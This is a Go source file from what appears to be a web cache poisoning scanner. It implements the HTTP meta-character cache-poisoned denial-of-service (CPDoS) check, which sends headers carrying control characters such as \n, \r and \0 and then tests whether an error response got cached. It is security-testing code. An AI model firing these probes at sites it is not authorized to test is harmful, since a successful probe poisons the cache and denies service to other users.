package cpdos

import (
	"fmt"
	"time"

	"github.com/projectdiscovery/gologger"
	"github.com/wealeson1/wcpvs/internal/models"
	"github.com/wealeson1/wcpvs/pkg/output"
	"github.com/wealeson1/wcpvs/pkg/utils"
)

var HMCTecniques *Hmc

type Hmc struct {
	headers []string
	values  []string
}

func init() {
	HMCTecniques = NewHmc()
}

func NewHmc() *Hmc {
	return &Hmc{
		headers: []string{"X-Metachar-Header", "\\n"},
		values:  []string{"\\n", "\\r", "\\a", "\\0", "\\b", "\\e", "\\v", "\\f", "\\u0000"},
	}
}

func (h *Hmc) Scan(target *models.TargetStruct) {
	if target.Cache.NoCache {
		return
	}

	// 创建验证器
	verifier := utils.NewPoisoningVerifier()

	// 测试不同的元字符组合
	for _, header := range h.headers {
		for _, value := range h.values {
			time.Sleep(100 * time.Millisecond) // 减少延迟，验证框架会处理等待

			// 创建攻击请求（带元字符的header）
			attackReq, err := utils.CloneRequest(target.Request)
			if err != nil {
				gologger.Debug().Msgf("HMC: Failed to clone request: %v", err)
				continue
			}
			attackReq.Header.Set(header, value)

			// 创建验证请求（不带元字符header）
			verifyReq, err := utils.CloneRequest(target.Request)
			if err != nil {
				continue
			}

			// 使用验证框架验证
			result, err := verifier.Verify(target, attackReq, verifyReq)
			if err != nil {
				gologger.Debug().Msgf("HMC verification failed for %s=%s: %v", header, value, err)
				continue
			}

			// 检查是否存在漏洞
			if result.IsVulnerable {
				// 直接使用验证框架保存的body
				respBody := result.VerifyBody

				// 输出详细报告
				payloadInfo := fmt.Sprintf("Meta-character in header: %s=%s ⚠️", header, value)
				attackVector := fmt.Sprintf("Meta-character %s in header %s causes error", value, header)
				ReportCPDoSVulnerability(target, output.VulnTypeCPDoSHMC, attackVector,
					result.VerifyResp, respBody, attackReq, payloadInfo)

				gologger.Debug().Msgf("HMC poisoning verified in %v (header: %s=%s, attack: %d, verify: %d)",
					result.TotalTime, header, value, result.AttackStatus, result.VerifyStatus)
				return
			}
		}
	}
}
